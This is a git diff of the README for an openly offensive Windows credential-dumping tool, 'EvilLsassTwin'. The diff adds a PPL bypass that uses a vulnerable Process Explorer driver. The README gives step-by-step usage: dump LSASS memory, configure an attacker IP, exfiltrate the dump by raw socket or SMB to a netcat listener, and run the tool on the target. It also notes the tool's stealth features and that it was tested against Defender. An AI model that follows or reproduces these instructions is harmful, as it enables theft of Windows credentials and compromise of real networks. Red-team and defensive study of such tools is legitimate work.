@@ -7,8 +7,12 @@ The process cloning functionality has been updated to use make use of NtCreatePr
 
 Partial implementation of Process Ghosting technique is included to make use of the Delete On Close functionality. 
 
+## PPL-Branch Updates
+This branch enables PPL-bypassing through the use of the vulnerable Process Explorer driver. 
+
+## Overview
 How this works: 
-1. MiniDumpWriteDump function is used to dump forked LSASS process's memory into a file on-disk.
+1. MiniDumpWriteDump function is used to dump forked LSASS process's memory into a file on-disk. OR using handle to LSASS returned from Process Explorer Driver, MiniDumpWriteDump function is used to directly dump LSASS process's memory to a file on-disk.
 2. File is marked with Delete on Close and does not allow other threads to access it simultaneously.
 3. File is mapped into memory
 4. File is deleted after open handle to it is closed
@@ -16,20 +20,20 @@ How this works:
  
 Requires the `winim` and `ptr_math` modules. Several IOCs and opportunities for detection since this simple port was not originally built with stealth in mind. However, as noted above, this project _does_ include some stealthy features. 
 
-Tested on Windows 10 22H2 and Windows 11 with Defender enabled (Cloud Analysis disabled).
+Tested on Windows 10 22H2 and Windows 11 22H2 with Defender enabled (Cloud Analysis disabled).
 
 Must be run from an Administrator Command Prompt or Powershell as EvilLsassTwin depends on the SeDebugPrivilege. 
 
 _Note: SeDebugPrvilege is enabled by default on Elevated Powershell._
 
-_Note: Tool will **not** work against PPL or Credential Guard. Tool also will not work when EDRs patch LSASS a la [Cortex XDR Modifications](https://www.paloaltonetworks.com/blog/security-operations/detecting-credential-stealing-with-cortex-xdr/)_
+_Note: Tool will **not** work against Credential Guard. Tool also will not work when EDRs patch LSASS a la [Cortex XDR Modifications](https://www.paloaltonetworks.com/blog/security-operations/detecting-credential-stealing-with-cortex-xdr/)_
 
 # Usage
 This project was developed and tested with Nim 1.6.10 and 1.6.14. It is **not** compatible with Nim 2.0.
 
 1. Install Dependencies with `nim dependencies` or through Nimble package manager (Atlas not yet tested)
 2. Edit line 5  in `EvilLsassTwin.nim` file to include your server's (attacker machine) IP address. Optionally: You may change the port number on line 6 as well. If you do change the port, it needs to be changed within the `EvilTwinServer.nim` file as well.
-3. (Optional) If you want to exfiltrate the dumpfile using SMB instead of a raw socket, edit lines 7 to include the SMB Share name, line 9 (`const useSMB`) to be true and line 10 (`const useRawSocket`) to be false.
+3. (Optional) If you want to exfiltrate the dumpfile using SMB instead of a raw socket, edit lines 7 to include the SMB Share name, and set line 21 (`var exfil: exfilMethod = useRaw`) to `useSMB` .
 4. Compile the project with `nim build`. _Note: this assumes EvilTwinServer will be run on a Linux machine. Manual compilation required otherwise_
 5. `chmod +x EvilTwinServer && ./EvilTwinServer` Alternatively: `nc -lvnp 6500 > EvilTwin.dmp`
 6. Transfer EvilLsassTwin.exe to (Windows) target machine and Run.   
@@ -48,3 +52,5 @@ This project was developed and tested with Nim 1.6.10 and 1.6.14. It is **not** 
 [Splintercod3 - The Hidden Side of Seclogon - Part 2](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html)
 
 [Diversenok - The Definitive Guide to Process Cloning on Windows](https://diversenok.github.io/2023/04/20/Process-Cloning.html)
+
+[PPLBlade](https://github.com/tastypepperoni/PPLBlade)
